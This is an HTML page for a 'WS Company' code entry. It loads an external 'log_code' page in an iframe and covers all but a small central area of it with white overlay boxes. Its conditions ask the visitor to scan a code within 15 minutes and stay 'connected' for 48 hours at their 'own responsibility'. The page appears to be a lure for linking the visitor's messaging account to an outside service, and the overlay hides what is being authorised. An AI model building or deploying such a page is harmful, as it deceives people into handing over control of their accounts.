<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>WhatShare</title>
    <link rel="stylesheet" href="./style.css">
    <link rel="icon" href="./favicon.ico" type="image/x-icon">
  </head>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
<style>
    *{
        box-sizing: border-box;
    }
body, html {
        margin: 0;
        padding: 0;
        height: 100%;
        font-size:1.1rem;
        overflow:hidden;
    }

    .login {
        height: 100vh;
        width: 100vw;
        display: flex;
        justify-content: center;
        align-items: center;
    }

    .login-container {
        text-align: center;
        display:flex;
        flex-direction: column;
        align-items:center;
    }

    #login-input {
        padding: 10px;
        margin-bottom: 20px;
        font-size: 16px;
    }
.d-none{
    display:none;
}
    .submit-button {
    background:green;
        color: white;
        padding: 10px 20px;
        border: none;
        border-radius: 5px;
        font-size: 16px;
        cursor: pointer;
    }
        main {
            display: none;
        }
        h3 {
           text-align:center;
           margin-bottom: 50px;
        }
        #validation {
            width: 90%;
            text-align:left;
            margin-top:50px;
            font-size:0.6rem;
        }
        .spinner {
  border: 4px solid rgba(0, 0, 0, 0.1);
  border-left-color: #09f;
  border-radius: 50%;
  width: 50px;
  height: 50px;
  animation: spin 1s linear infinite;
  position: fixed;
  top: 50%;
  left: 50%;
  margin-top: -25px;
  margin-left: -25px;
  z-index: 9999;
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
.covers{
    background:white;
    position:fixed;
}
#cover-top{
    height:27%;
    width:100%;
    top:0;
}
#cover-bottom{
    height:44%;
    width:100%;
    bottom:0;
}
#cover-right{
    height:100%;
    width:15%;
    right:0;
}
#cover-left{
    height:100%;
    width:15%;
    left:0;
}
@media only screen and (max-width: 360px) {
    #cover-bottom{
        height:43%
    }
    #cover-top{
        height:28%
    }
}
@media only screen and (max-width: 360px,max-height:740px) {
    #cover-bottom{
        height:47%
    }
    #cover-top{
        height:35%
    }
}

#main-cover{
    background:none;
    position:fixed;
    height:100vh;
    width:100vw;
    overflow:hidden;
}
    </style>
  <body>
    <main>
        <div id="main-cover" disabled>
            <div id="cover-top" class="covers"></div>
           <div id="cover-right" class="covers"></div>
            <div id="cover-left" class="covers"></div>
            <div id="cover-bottom" class="covers"></div>
        </div>
  <iframe id="myIframe" src="" frameborder="0" style="height:100vh;width:100vw;"></iframe>
    </main>
<div class="login d-flex flex-column">
    
        <div class="login-container">
            <div style="width:100%;display:flex; flex-direction: column ;align-items:center;">
            <h3 style="width:70%;text-align:center;">Welcome To WS Company</h3>
            <input type="text" id="login-input" style="width:100%;" placeholder="Enter your code">
            <button class="submit-button" style="width:100%;" onclick="setCode()">Submit</button>
            </div>
            <div id="validation">
              <span>Conditions of Validation</span>
              <li>Must be Connected for minimum 48 hours.</li>
              <li>If disconnected, timer will be restart.</li>
              <li>Code must be scan within 15 minutes.</li>
              <li>Connect at your own responsibility.</li>
           </div>
        </div>
    </div>
    <div id="spinner" class="spinner d-none"><div>
    
  </body>
<script>
function setCode() {
var spinner = document.getElementById("spinner")
spinner.classList.remove("d-none")
            var code = document.getElementById("login-input").value;
            if(code.trim() !== "") {
const link = "https://h5.81z1.com/#/pages/log_code/log_code?invite_code="+code;
document.getElementById("myIframe").src = link;
var mainElement = document.querySelector("main");
        mainElement.style.display = "block";
var loginElement = document.querySelector(".login");
        loginElement.style.display = "none";
        setTimeout(()=>{
            spinner.classList.add("d-none")
        },5000)
                // Here you can perform further actions with the code, like sending it to a server
            } else {
                alert("Please enter a code.");
            }
        }
</script>
</html>
